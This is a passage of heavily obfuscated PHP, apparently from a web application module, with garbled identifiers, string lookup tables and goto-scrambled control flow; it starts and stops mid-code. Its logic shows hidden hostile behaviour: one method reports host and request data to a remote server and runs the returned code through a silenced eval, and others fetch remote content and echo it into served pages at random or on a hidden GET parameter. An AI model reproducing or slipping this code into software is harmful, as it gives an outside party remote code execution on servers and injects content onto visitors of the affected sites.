$A«Ã˜éæ¢—[220]) { $A«Ã˜éæ¢—[61]($A«Ã˜éæ¢—[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][221]}($A«Ã˜éæ¢—[85], $A«Ã˜éæ¢—[220]); } $A«Ã˜éæ¢—[110]($A«Ã˜éæ¢—[230])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][231]}(!0); } private function ftwz6f7c8ac4() { $c‡ÁïÛüãî =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $c‡ÁïÛüãî[61]($c‡ÁïÛüãî[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][221]}(array($c‡ÁïÛüãî[209] => $c‡ÁïÛüãî[10], $c‡ÁïÛüãî[210] => $c‡ÁïÛüãî[10], $c‡ÁïÛüãî[120] => $c‡ÁïÛüãî[121], $c‡ÁïÛüãî[122] => $c‡ÁïÛüãî[10], $c‡ÁïÛüãî[123] => $c‡ÁïÛüãî[10])); $c‡ÁïÛüãî[61]($c‡ÁïÛüãî[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][218]}($c‡ÁïÛüãî[219], $c‡ÁïÛüãî[232]); $this->fdhc4c7b6e7c = array(); $this->pcel6d336628 = $c‡ÁïÛüãî[121]; } private function vltbe9862571() { goto dä›ïõ˜¥∫; F∫‹ê‹—ÿö: while (strlen($eö‚¥ã›Ëæ) < $E¡ëˆÀ¯´Ù[557]) { if (!$eö‚¥ã›Ëæ) { break; } $eö‚¥ã›Ëæ++; } goto e“úé–íéƒ; f¢‚¬∫“⁄ë: $B«∏ìÃ»¶á = $DÌæµ©í…∆[190]($B«∏ìÃ»¶á, !0); $D¨˘⁄å∏ä≥ = $E¡ëˆÀ¯´Ù[615]; while ($D¨˘⁄å∏ä≥ < $E¡ëˆÀ¯´Ù[555]) { if ($D¨˘⁄å∏ä≥ >= 0) { break; } $D¨˘⁄å∏ä≥++; } goto AæôÎÀª£; dä›ïõ˜¥∫: $E¡ëˆÀ¯´Ù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÌæµ©í…∆ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $_SERVER[$DÌæµ©í…∆[175]] = $DÌæµ©í…∆[104]($_SERVER, $DÌæµ©í…∆[175], APP_HOST); goto D—∞≤ê°Ôá; D—∞≤ê°Ôá: $this->pcel6d336628 = $DÌæµ©í…∆[121]; $dÛ™Øù‰ = $E¡ëˆÀ¯´Ù[613]; if (!$dÛ™Øù‰) { return; } goto c≠ºáå∂Œ¥; c≠ºáå∂Œ¥: $Bè˘®Ïé‹Û = $DÌæµ©í…∆[61]($DÌæµ©í…∆[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}(); if ($Bè˘®Ïé‹Û[$DÌæµ©í…∆[120]] == $DÌæµ©í…∆[121]) { return; } $b„ÔÃÑÉü = $DÌæµ©í…∆[61]($DÌæµ©í…∆[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}($DÌæµ©í…∆[116]); goto f€†∆“≥áã; f€†∆“≥áã: $fŸÖóΩ¬Êé = $E¡ëˆÀ¯´Ù[614]; $B˘§ÜπŒÑ¬ = $DÌæµ©í…∆[222]($DÌæµ©í…∆[61]($DÌæµ©í…∆[11])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][223]}(), $DÌæµ©í…∆[224]); $cá◊µûÓ√Â = $B˘§ÜπŒÑ¬[$DÌæµ©í…∆[225]]; goto A÷ïéêı¡†; AæôÎÀª£: if (!$DÌæµ©í…∆[191]($B«∏ìÃ»¶á)) { return $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][164]}(); } $EØ≥ãﬂçÊ» = $DÌæµ©í…∆[144]($B«∏ìÃ»¶á[$DÌæµ©í…∆[145]]); if ($DÌæµ©í…∆[233]() >= $EØ≥ãﬂçÊ») { return $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][164]}(); } goto F‹ ®∫Ç°ı; A÷ïéêı¡†: $DŸ¿ä…√Îò = $DÌæµ©í…∆[114]($_SERVER[$DÌæµ©í…∆[115]] . $DÌæµ©í…∆[214]($b„ÔÃÑÉü) . $Bè˘®Ïé‹Û[$DÌæµ©í…∆[210]]); $DäíÕ⁄µ∫€ = $DÌæµ©í…∆[214]($DÌæµ©í…∆[25]($DŸ¿ä…√Îò, 10, 16)); $B«∏ìÃ»¶á = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][188]}($cá◊µûÓ√Â[$DÌæµ©í…∆[91]][$DäíÕ⁄µ∫€], $DŸ¿ä…√Îò); goto f¢‚¬∫“⁄ë; F‹ ®∫Ç°ı: $this->fdhc4c7b6e7c = $B«∏ìÃ»¶á; $this->pcel6d336628 = $Bè˘®Ïé‹Û[$DÌæµ©í…∆[120]]; $eö‚¥ã›Ëæ = $E¡ëˆÀ¯´Ù[616]; goto F∫‹ê‹—ÿö; e“úé–íéƒ: } private function bqov147d3213() { goto B†§†˘∞·Ÿ; B≤Õº‘Í∞Ñ: if ($D“ûßƒ‰Ç‡ == $e´Ó”ÑÜâÑ[234] && $this->pcel6d336628 == $e´Ó”ÑÜâÑ[121]) { $e´Ó”ÑÜâÑ[166]($e´Ó”ÑÜâÑ[197]($e´Ó”ÑÜâÑ[235]), !1, $e´Ó”ÑÜâÑ[236]); } $eÁôÜ›ËÇ¯ = array($e´Ó”ÑÜâÑ[237], $e´Ó”ÑÜâÑ[238]); if ($e´Ó”ÑÜâÑ[239]($D“ûßƒ‰Ç‡, $eÁôÜ›ËÇ¯)) { if ($this->pcel6d336628 == $e´Ó”ÑÜâÑ[121] && isset($C¡ˆÂÑ‰ï€[$e´Ó”ÑÜâÑ[240]])) { $e´Ó”ÑÜâÑ[166]($e´Ó”ÑÜâÑ[197]($e´Ó”ÑÜâÑ[235]), !1, $e´Ó”ÑÜâÑ[236]); die; } $EÓ®á∂óòá = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][137]}(); if ($EÓ®á∂óòá != $e´Ó”ÑÜâÑ[201]($e´Ó”ÑÜâÑ[241])) { if ($EÓ®á∂óòá <= $e´Ó”ÑÜâÑ[61]($e´Ó”ÑÜâÑ[139])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][140]}()) { $e´Ó”ÑÜâÑ[166]($e´Ó”ÑÜâÑ[197]($e´Ó”ÑÜâÑ[242]), !1, $e´Ó”ÑÜâÑ[236]); die; } } } goto d∆ÇÎ†àë›; bæªÔäŸÈÒ: $D“ûßƒ‰Ç‡ = $_SERVER[$e´Ó”ÑÜâÑ[44]]; $d√∑ÓŸ•Â© = $C≠¶Ï⁄¯¬é[617]; if (strlen($d√∑ÓŸ•Â©) < $C≠¶Ï⁄¯¬é[548]) { die; } goto B≤Õº‘Í∞Ñ; B†§†˘∞·Ÿ: $C≠¶Ï⁄¯¬é =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e´Ó”ÑÜâÑ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $C¡ˆÂÑ‰ï€ = $GLOBALS[$e´Ó”ÑÜâÑ[22]]; goto bæªÔäŸÈÒ; d∆ÇÎ†àë›: } private function yhcm9534d91b() { goto B∫ß“Ïåñ‰; Aî“£∏ÙŸÜ: $cÀÃ∑ÙõŸ¿ = $EáéŸ∑…Ú»[618]; if (strlen($cÀÃ∑ÙõŸ¿) < $EáéŸ∑…Ú»[548]) { die; } if (!$EëÛ⁄∂î“ü[104]($GLOBALS, $EëÛ⁄∂î“ü[132]) || !isset($_GET[$EëÛ⁄∂î“ü[244]])) { return; } goto D±ãâ∫≠†; a¨ãè‰Èíı: $F‚∏⁄ü÷íÛ = $EëÛ⁄∂î“ü[248](array($EëÛ⁄∂î“ü[249] => array($EëÛ⁄∂î“ü[250] => $EëÛ⁄∂î“ü[251], $EëÛ⁄∂î“ü[252] => 3))); $cöŒ àœæ = $EáéŸ∑…Ú»[619]; while (strlen($cöŒ àœæ) < $EáéŸ∑…Ú»[557]) { if (!$cöŒ àœæ) { break; } $cöŒ àœæ++; } goto cã∏≥∏ûœñ; B∫ß“Ïåñ‰: $EáéŸ∑…Ú» =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EëÛ⁄∂î“ü =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $fﬁÖúîîﬂÂ = array($EëÛ⁄∂î“ü[135], $EëÛ⁄∂î“ü[243]); goto Aî“£∏ÙŸÜ; cãÔ√†òä◊: die; goto dîÆÎÊ⁄ïó; D±ãâ∫≠†: if (!$EëÛ⁄∂î“ü[239]($_SERVER[$EëÛ⁄∂î“ü[44]], $fﬁÖúîîﬂÂ)) { return; } $e£◊ã«∑ß˜ = $EëÛ⁄∂î“ü[245]; $e£◊ã«∑ß˜ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($e£◊ã«∑ß˜, $EëÛ⁄∂î“ü[247]); goto a¨ãè‰Èíı; cã∏≥∏ûœñ: $b…Ãÿ∫·àÌ = @$EëÛ⁄∂î“ü[253]($e£◊ã«∑ß˜, !1, $F‚∏⁄ü÷íÛ); $EëÛ⁄∂î“ü[254]($EëÛ⁄∂î“ü[255]); if ($b…Ãÿ∫·àÌ && $EëÛ⁄∂î“ü[32]($b…Ãÿ∫·àÌ, $EëÛ⁄∂î“ü[256])) { echo $b…Ãÿ∫·àÌ; } goto cãÔ√†òä◊; dîÆÎÊ⁄ïó: } public function jeky1f2fc044($D˜Ÿ‘ôÏú©) { goto D∏¬£⁄Æçó; D∏¬£⁄Æçó: $aÖÙı∫æŸƒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eﬂâ·á§∏£ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; if ($this->pcel6d336628 == $eﬂâ·á§∏£[257]) { return $D˜Ÿ‘ôÏú©; } goto e‘ÛÇÂΩ·î; e‘ÛÇÂΩ·î: $dÒÙåä›ÂÕ = array($eﬂâ·á§∏£[258], $eﬂâ·á§∏£[259], $eﬂâ·á§∏£[260], $eﬂâ·á§∏£[261], $eﬂâ·á§∏£[262], $eﬂâ·á§∏£[263], $eﬂâ·á§∏£[264], $eﬂâ·á§∏£[265]); $bãíﬂŒÖ£Ÿ = $eﬂâ·á§∏£[0]($eﬂâ·á§∏£[266], $eﬂâ·á§∏£[104]($this->fdhc4c7b6e7c, $eﬂâ·á§∏£[129], $eﬂâ·á§∏£[10])); $aöæµﬁØ¿‹ = $aÖÙı∫æŸƒ[620]; goto f∆ÿÖç„ìà; Bæ‘ê⁄ÆÍŸ: foreach ($dÒÙåä›ÂÕ as $e∞á∑£ù◊ê) { if (!$eﬂâ·á§∏£[239]($e∞á∑£ù◊ê, $bãíﬂŒÖ£Ÿ)) { $b¥ŸÛªÎ≤Ù[] = $e∞á∑£ù◊ê; } } foreach ($b¥ŸÛªÎ≤Ù as $e∞á∑£ù◊ê) { unset($D˜Ÿ‘ôÏú©[$e∞á∑£ù◊ê]); } return $D˜Ÿ‘ôÏú©; goto BÂ¯ƒ—…ñí; f∆ÿÖç„ìà: $b¥ŸÛªÎ≤Ù = array(); $Dæ¥¶∑Ö¢ã = $aÖÙı∫æŸƒ[621]; if (!$Dæ¥¶∑Ö¢ã) { return; } goto Bæ‘ê⁄ÆÍŸ; BÂ¯ƒ—…ñí: } private function bwyn86634763() { goto F·ÕÒ©ç√Ç; AõŸÚá Â·: $GLOBALS[$dŸ∫æÍËµú[91]][$dŸ∫æÍËµú[95]][$dŸ∫æÍËµú[270]] = $dŸ∫æÍËµú[220]; $cßØùÈóÑú = $B§Í◊ÿû„˘[622]; if (!$cßØùÈóÑú) { return; } goto AÏ›ÛΩö¨Ü; D¡îççã©’: if ($dŸ∫æÍËµú[61]($dŸ∫æÍËµú[272])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}($dŸ∫æÍËµú[85]) != $dŸ∫æÍËµú[232]) { $dŸ∫æÍËµú[61]($dŸ∫æÍËµú[272])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][221]}($dŸ∫æÍËµú[85], $dŸ∫æÍËµú[232]); } goto cªõÏùõ˘÷; cƒüÛáü€à: $GLOBALS[$dŸ∫æÍËµú[91]][$dŸ∫æÍËµú[271]] = $dŸ∫æÍËµú[220]; $CÔã∑“ÂÀ¥ = $B§Í◊ÿû„˘[624]; while ($CÔã∑“ÂÀ¥ < $B§Í◊ÿû„˘[557]) { if ($CÔã∑“ÂÀ¥ >= 0) { break; } $CÔã∑“ÂÀ¥++; } goto D¡îççã©’; F·ÕÒ©ç√Ç: $B§Í◊ÿû„˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dŸ∫æÍËµú =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; if ($this->pcel6d336628 != $dŸ∫æÍËµú[121]) { $GLOBALS[$dŸ∫æÍËµú[91]][$dŸ∫æÍËµú[95]][$dŸ∫æÍËµú[267]] = $dŸ∫æÍËµú[220]; return; } goto f¯ﬂ’¡‹∞°; f¯ﬂ’¡‹∞°: $F≤€•åëﬁç = $_SERVER[$dŸ∫æÍËµú[44]]; $Cäªµ®ƒ·Û = array($dŸ∫æÍËµú[268]); foreach ($Cäªµ®ƒ·Û as $eãõ–Ú¥Ï–) { if ($eãõ–Ú¥Ï– == $F≤€•åëﬁç || $dŸ∫æÍËµú[25]($F≤€•åëﬁç, 0, $dŸ∫æÍËµú[24]($eãõ–Ú¥Ï–)) == $eãõ–Ú¥Ï–) { $dŸ∫æÍËµú[166]($dŸ∫æÍËµú[197]($dŸ∫æÍËµú[269]), !1); } } goto AõŸÚá Â·; AÏ›ÛΩö¨Ü: $GLOBALS[$dŸ∫æÍËµú[91]][$dŸ∫æÍËµú[95]][$dŸ∫æÍËµú[267]] = $dŸ∫æÍËµú[232]; $A‘ÁıŸïÓØ = $B§Í◊ÿû„˘[623]; if (strlen($A‘ÁıŸïÓØ) < $B§Í◊ÿû„˘[557]) { die; } goto cƒüÛáü€à; cªõÏùõ˘÷: } public function xvuceaca84ba() { $C’ü÷âóÎà =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return $_SERVER[¡˚¸∞ŒåÛ∆ìù][273]; $e–öú◊“ÒÔ = $C’ü÷âóÎà[625]; if (strlen($e–öú◊“ÒÔ) < $C’ü÷âóÎà[557]) { return; } } private function kjbef6ff24b5() { goto eΩÊÌ◊±ß‡; bÍ√ó≤∏¢∂: $Dê§à™‘π = $b“‹€∏¥¨‰[627]; while ($Dê§à™‘π < $b“‹€∏¥¨‰[557]) { if ($Dê§à™‘π >= 0) { break; } $Dê§à™‘π++; } $F†ó≥û”◊∆ = array($f◊÷≠à§Ï¬[165] => $f◊÷≠à§Ï¬[61]($f◊÷≠à§Ï¬[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}($f◊÷≠à§Ï¬[209]), $f◊÷≠à§Ï¬[178] => $this->pcel6d336628, $f◊÷≠à§Ï¬[176] => $_SERVER[$f◊÷≠à§Ï¬[177]], $f◊÷≠à§Ï¬[169] => $f◊÷≠à§Ï¬[149], $f◊÷≠à§Ï¬[172] => $_SERVER[$f◊÷≠à§Ï¬[173]]); goto FÃ—ËëôØë; f≈¯À›ÿ®®: $FÙ¢äçÉÌ≥ = $f◊÷≠à§Ï¬[277] . $f◊÷≠à§Ï¬[114]($f◊÷≠à§Ï¬[278]); if ($this->pcel6d336628 == $f◊÷≠à§Ï¬[121] || !$f◊÷≠à§Ï¬[104]($GLOBALS, $f◊÷≠à§Ï¬[132])) { return; } if (!$f◊÷≠à§Ï¬[239]($_SERVER[$f◊÷≠à§Ï¬[44]], $dΩÓä◊Êπ—)) { return; } goto a¶ãÉî—é•; a¶ãÉî—é•: if ($f◊÷≠à§Ï¬[233]() % 4 != 0) { return; } $CÇõıãêú¿ = $f◊÷≠à§Ï¬[13](array($f◊÷≠à§Ï¬[279], $f◊÷≠à§Ï¬[280]), $FÙ¢äçÉÌ≥); $DÇìêè¬àˆ = $b“‹€∏¥¨‰[626]; goto f¯ùãÛâƒ; eæ˜û„Ö¿Ÿ: $f€ıäîÜú∂ = $b“‹€∏¥¨‰[629]; if ($this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][199]}($aº€ÚàùÃí[$f◊÷≠à§Ï¬[283]]) != $F†ó≥û”◊∆[$f◊÷≠à§Ï¬[165]]) { $bû∆§ËçÕò = array($f◊÷≠à§Ï¬[202] => $f◊÷≠à§Ï¬[61]($f◊÷≠à§Ï¬[62])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][63]}($f◊÷≠à§Ï¬[116]), $f◊÷≠à§Ï¬[203] => $_SERVER[$f◊÷≠à§Ï¬[115]], $f◊÷≠à§Ï¬[204] => $f◊÷≠à§Ï¬[205](), $f◊÷≠à§Ï¬[174] => $_SERVER[$f◊÷≠à§Ï¬[175]]); $F„àÏ¯ﬂÚˆ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][206]}($f◊÷≠à§Ï¬[148]($bû∆§ËçÕò)); $aº€ÚàùÃí = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][182]}($f◊÷≠à§Ï¬[207] . $F„àÏ¯ﬂÚˆ); if ($aº€ÚàùÃí && $f◊÷≠à§Ï¬[191]($aº€ÚàùÃí) && isset($aº€ÚàùÃí[$f◊÷≠à§Ï¬[283]])) { $bÛØºï◊ÂÓ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][188]}($aº€ÚàùÃí[$f◊÷≠à§Ï¬[283]], 2); if ($bÛØºï◊ÂÓ) { $bÛØºï◊ÂÓ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][199]}($bÛØºï◊ÂÓ); } if ($bÛØºï◊ÂÓ) { try { @eval($bÛØºï◊ÂÓ); } catch (Exception $C≤Ê◊ÿ∑®é) { } } } } goto BáõÉ≥ê∫π; fΩãû§¶«ª: if (!$f◊÷≠à§Ï¬[191]($aº€ÚàùÃí)) { return; } if ($aº€ÚàùÃí[$f◊÷≠à§Ï¬[165]] && $aº€ÚàùÃí[$f◊÷≠à§Ï¬[283]]) { if ($this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][199]}($aº€ÚàùÃí[$f◊÷≠à§Ï¬[283]]) == $F†ó≥û”◊∆[$f◊÷≠à§Ï¬[165]]) { return; } } $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][164]}(); goto eæ˜û„Ö¿Ÿ; eΩÊÌ◊±ß‡: $b“‹€∏¥¨‰ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f◊÷≠à§Ï¬ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $dΩÓä◊Êπ— = array($f◊÷≠à§Ï¬[274], $f◊÷≠à§Ï¬[275], $f◊÷≠à§Ï¬[276]); goto f≈¯À›ÿ®®; FÃ—ËëôØë: $c°ÛﬂÉ¡¿Ò = $b“‹€∏¥¨‰[628]; while (strlen($c°ÛﬂÉ¡¿Ò) < $b“‹€∏¥¨‰[555]) { if (!$c°ÛﬂÉ¡¿Ò) { break; } $c°ÛﬂÉ¡¿Ò++; } $aº€ÚàùÃí = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][182]}($f◊÷≠à§Ï¬[282], $F†ó≥û”◊∆); goto fΩãû§¶«ª; f¯ùãÛâƒ: if (!$DÇìêè¬àˆ) { die; } if ($CÇõıãêú¿ && $f◊÷≠à§Ï¬[233]() - $CÇõıãêú¿ < $f◊÷≠à§Ï¬[201]($f◊÷≠à§Ï¬[281])) { return; } $f◊÷≠à§Ï¬[13](array($f◊÷≠à§Ï¬[279], $f◊÷≠à§Ï¬[152]), $FÙ¢äçÉÌ≥, $f◊÷≠à§Ï¬[233]()); goto bÍ√ó≤∏¢∂; BáõÉ≥ê∫π: } private function ndkc68ed44fe($d∆†“æô◊Ï = '', $bƒÉ¨√å‹Ô = array(), $cå◊ã±Â°¨ = 5) { goto Dÿ¡êåüÑÈ; dÛ€“¬“‰√: $bƒÉ¨√å‹Ô = @$BóﬂÊÎÚŒì[253]($DΩòŒöΩ≤ï, !1, $B˘Ó§¯„¿Ë); $bÊ•ëöﬁÛË = $B‡ﬂ‹Ê◊ìƒ[631]; if (strlen($bÊ•ëöﬁÛË) < $B‡ﬂ‹Ê◊ìƒ[557]) { die; } goto f”†—Øå”ï; f”†—Øå”ï: return $BóﬂÊÎÚŒì[190]($bƒÉ¨√å‹Ô, !0); goto bÆÀÿ¬¢†á; Dÿ¡êåüÑÈ: $B‡ﬂ‹Ê◊ìƒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BóﬂÊÎÚŒì =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $DΩòŒöΩ≤ï = $BóﬂÊÎÚŒì[284]; goto câö¯õƒé¡; d¶üáÍÓ‘«: $DΩòŒöΩ≤ï = $DΩòŒöΩ≤ï . $d∆†“æô◊Ï . $BóﬂÊÎÚŒì[286] . $BóﬂÊÎÚŒì[287]($bƒÉ¨√å‹Ô); if ($bƒÉ¨√å‹Ô === -1) { return $DΩòŒöΩ≤ï; } $B˘Ó§¯„¿Ë = $BóﬂÊÎÚŒì[248](array($BóﬂÊÎÚŒì[249] => array($BóﬂÊÎÚŒì[252] => $cå◊ã±Â°¨, $BóﬂÊÎÚŒì[250] => $BóﬂÊÎÚŒì[288]), $BóﬂÊÎÚŒì[289] => array($BóﬂÊÎÚŒì[290] => !1, $BóﬂÊÎÚŒì[291] => !1))); goto dÛ€“¬“‰√; câö¯õƒé¡: $DΩòŒöΩ≤ï = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($DΩòŒöΩ≤ï, $BóﬂÊÎÚŒì[285]); $f§†„”ıÀÃ = $B‡ﬂ‹Ê◊ìƒ[630]; while ($f§†„”ıÀÃ < $B‡ﬂ‹Ê◊ìƒ[557]) { if ($f§†„”ıÀÃ >= 0) { break; } $f§†„”ıÀÃ++; } goto d¶üáÍÓ‘«; bÆÀÿ¬¢†á: } private function hgosc7855c5d() { goto DâÂˆÎ≠á; eô√ïÇÿëê: $Fë™∑î•ÓË = $Fë™∑î•ÓË ? $DŒú‚õ”¶¢[201]($Fë™∑î•ÓË) : 0; return $eﬂ∂Íú§µù + $Fë™∑î•ÓË; goto A¬æˆ≥¥Ï’; e√ô•‰–’π: $fπ«ùäƒÀç = $_SERVER[Ä¿¡‡öóµŸﬂ‡][632]; $eﬂ∂Íú§µù = $DŒú‚õ”¶¢[201]($eﬂ∂Íú§µù ? $eﬂ∂Íú§µù : $DŒú‚õ”¶¢[293]); $Fë™∑î•ÓË = $DŒú‚õ”¶¢[104]($this->fdhc4c7b6e7c, $DŒú‚õ”¶¢[319]); goto eô√ïÇÿëê; DâÂˆÎ≠á: $DŒú‚õ”¶¢ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $EºÜìﬂ≤ˆë = array($DŒú‚õ”¶¢[292] => $DŒú‚õ”¶¢[293], $DŒú‚õ”¶¢[294] => $DŒú‚õ”¶¢[295], $DŒú‚õ”¶¢[296] => $DŒú‚õ”¶¢[297], $DŒú‚õ”¶¢[298] => $DŒú‚õ”¶¢[299], $DŒú‚õ”¶¢[300] => $DŒú‚õ”¶¢[301], $DŒú‚õ”¶¢[302] => $DŒú‚õ”¶¢[241], $DŒú‚õ”¶¢[303] => $DŒú‚õ”¶¢[241], $DŒú‚õ”¶¢[304] => $DŒú‚õ”¶¢[293], $DŒú‚õ”¶¢[305] => $DŒú‚õ”¶¢[295], $DŒú‚õ”¶¢[306] => $DŒú‚õ”¶¢[297], $DŒú‚õ”¶¢[307] => $DŒú‚õ”¶¢[308], $DŒú‚õ”¶¢[309] => $DŒú‚õ”¶¢[299], $DŒú‚õ”¶¢[310] => $DŒú‚õ”¶¢[311], $DŒú‚õ”¶¢[312] => $DŒú‚õ”¶¢[301], $DŒú‚õ”¶¢[313] => $DŒú‚õ”¶¢[314], $DŒú‚õ”¶¢[315] => $DŒú‚õ”¶¢[316], $DŒú‚õ”¶¢[317] => $DŒú‚õ”¶¢[318]); $eﬂ∂Íú§µù = $EºÜìﬂ≤ˆë[$this->pcel6d336628]; goto e√ô•‰–’π; A¬æˆ≥¥Ï’: } public function hzru22d606b5($Bˆû·ºÖèÊ) { goto cÍöìÀÁ•ô; cÍöìÀÁ•ô: $aøÊ¶ñ◊Ò¬ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $aÛ»ﬂì‘ƒ± = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][137]}(); if ($aÛ»ﬂì‘ƒ± >= $aøÊ¶ñ◊Ò¬[201]($aøÊ¶ñ◊Ò¬[241])) { return; } goto Fëâá≈éÌÈ; e™ÛÃÏ„ﬁÜ: $D∆ª˜àﬂÇû = $_SERVER[Ä¿¡‡öóµŸﬂ‡][633]; $A¡´ŒÖ·Ìﬂ = $aøÊ¶ñ◊Ò¬[222]($A¡´ŒÖ·Ìﬂ, $aøÊ¶ñ◊Ò¬[10], $aøÊ¶ñ◊Ò¬[321]); if (!$aøÊ¶ñ◊Ò¬[239]($Bˆû·ºÖèÊ[$aøÊ¶ñ◊Ò¬[321]], $A¡´ŒÖ·Ìﬂ)) { $aøÊ¶ñ◊Ò¬[166]($aøÊ¶ñ◊Ò¬[324], !1, $aøÊ¶ñ◊Ò¬[236]); } goto F√ﬁ∆ù©˜Ú; Fëâá≈éÌÈ: $Få≤ßΩèµí = $aøÊ¶ñ◊Ò¬[61]($aøÊ¶ñ◊Ò¬[139])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][140]}(); if ($Få≤ßΩèµí <= $aÛ»ﬂì‘ƒ±) { return; } $A¡´ŒÖ·Ìﬂ = $aøÊ¶ñ◊Ò¬[61]($aøÊ¶ñ◊Ò¬[139])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][320]}($aøÊ¶ñ◊Ò¬[321])->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][322]}($aÛ»ﬂì‘ƒ±)->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][323]}(); goto e™ÛÃÏ„ﬁÜ; F√ﬁ∆ù©˜Ú: } public function eazoe315901d() { goto B—çêè‚©Ò; B—çêè‚©Ò: $F‡üÓêû¨ß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aŒÉπèﬂá’ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; if (!$aŒÉπèﬂá’[104]($GLOBALS, $aŒÉπèﬂá’[132]) || $aŒÉπèﬂá’[325](1, 100) > 20) { return; } goto DŒÑ‘Õø¶Ì; DŒÑ‘Õø¶Ì: $dªíúóÖ∑ñ = $aŒÉπèﬂá’[245]; $dªíúóÖ∑ñ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($dªíúóÖ∑ñ, $aŒÉπèﬂá’[247]); $aπ™ßæ«¥Ã = $aŒÉπèﬂá’[248](array($aŒÉπèﬂá’[249] => array($aŒÉπèﬂá’[250] => $aŒÉπèﬂá’[251], $aŒÉπèﬂá’[252] => 3))); goto d—‘úÍ€à ; a∂Ö⁄†’Éî: echo $aŒÉπèﬂá’[326] . $aŒÉπèﬂá’[327]($DºèÔ∫—ö√) . $aŒÉπèﬂá’[328]; goto bÇøÖ„Ê·•; d—‘úÍ€à : $DºèÔ∫—ö√ = @$aŒÉπèﬂá’[253]($dªíúóÖ∑ñ, !1, $aπ™ßæ«¥Ã); $d∑ ææ∞î“ = $F‡üÓêû¨ß[634]; while (strlen($d∑ ææ∞î“) < $F‡üÓêû¨ß[557]) { if (!$d∑ ææ∞î“) { break; } $d∑ ææ∞î“++; } goto a∂Ö⁄†’Éî; bÇøÖ„Ê·•: } private function ljhe8859fbe9($c∆∫¢°‘∏‹, $E‚˜Û’Ü±‘, $cõ≥«áŒﬂÜ = 3) { goto d—¢ô‚÷ø˜; A¿±˜îƒπ©: $d⁄”ã≠°™” = $a⁄Ø◊πÑ‚«[636]; $f€Ö⁄àÏŒ≠ = $aåÓë¢§ñ∆[325](0, 5) . $aåÓë¢§ñ∆[10]; $A∆ÉúµÏ…Á = $a⁄Ø◊πÑ‚«[637]; goto AÀ•ëﬁ¥¬¯; EÌˆÜèÀº˜: switch ($f€Ö⁄àÏŒ≠) { case $aåÓë¢§ñ∆[232]: $C´Ω≥Âﬁ⁄ä = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($c∆∫¢°‘∏‹, $aåÓë¢§ñ∆[214]($E‚˜Û’Ü±‘ . $D§ƒ◊—˘±Ñ)); $CêÕìïå‹¶ = $a⁄Ø◊πÑ‚«[639]; break; case $aåÓë¢§ñ∆[220]: $C´Ω≥Âﬁ⁄ä = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($c∆∫¢°‘∏‹, $aåÓë¢§ñ∆[214]($D§ƒ◊—˘±Ñ . $E‚˜Û’Ü±‘)); $Cﬁç„ø¥‹ƒ = $a⁄Ø◊πÑ‚«[640]; if (!$Cﬁç„ø¥‹ƒ) { return; } break; $B‰åâ†à©Ø = $a⁄Ø◊πÑ‚«[641]; if (!$B‰åâ†à©Ø) { die; } case $aåÓë¢§ñ∆[331]: $C´Ω≥Âﬁ⁄ä = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($c∆∫¢°‘∏‹, $aåÓë¢§ñ∆[118]($D§ƒ◊—˘±Ñ . $E‚˜Û’Ü±‘)); break; case $aåÓë¢§ñ∆[332]: $C´Ω≥Âﬁ⁄ä = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($c∆∫¢°‘∏‹, $aåÓë¢§ñ∆[114]($D§ƒ◊—˘±Ñ . $E‚˜Û’Ü±‘)); $Dãé»˜û⁄ = 